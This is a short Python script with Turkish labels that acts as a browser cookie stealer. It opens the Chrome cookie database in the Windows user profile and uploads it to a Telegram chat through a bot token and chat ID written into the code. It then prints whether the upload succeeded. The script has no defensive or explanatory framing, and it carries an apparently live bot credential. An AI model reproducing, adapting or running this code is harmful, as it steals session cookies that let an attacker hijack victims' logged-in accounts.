import requests
import os

TOKEN = "8557844893:AAGkayWSmLJMaCzFxFhDDQLhlGqUTCuruww"
CHAT_ID = "1791230559"

COOKIE_PATH = r"C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"

def telegram_gonder(dosya_yolu):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    # %USERNAME% çözünmesi için
    dosya_yolu = os.path.expandvars(dosya_yolu)

    with open(dosya_yolu, "rb") as f:
        files = {"document": f}
        data = {"chat_id": CHAT_ID}
        r = requests.post(url, files=files, data=data)

    if r.status_code == 200:
        print("Cookie dosyası gönderildi.")
    else:
        print("Gönderilemedi:", r.text)

if __name__ == "__main__":
    telegram_gonder(COOKIE_PATH)
